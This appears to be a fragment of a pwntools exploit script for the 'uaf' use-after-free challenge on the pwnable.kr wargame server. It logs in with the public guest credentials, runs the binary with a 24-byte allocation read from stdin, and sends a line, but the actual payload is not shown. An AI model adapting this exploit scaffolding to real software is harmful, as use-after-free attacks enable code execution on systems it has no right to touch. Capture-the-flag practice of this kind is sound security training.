from pwn import *

s = ssh(host='pwnable.kr', port=2222, user='uaf', password='guest')
p = s.process(['./uaf', '24', '/dev/stdin'])
p.recv(1024)
p.sendline()
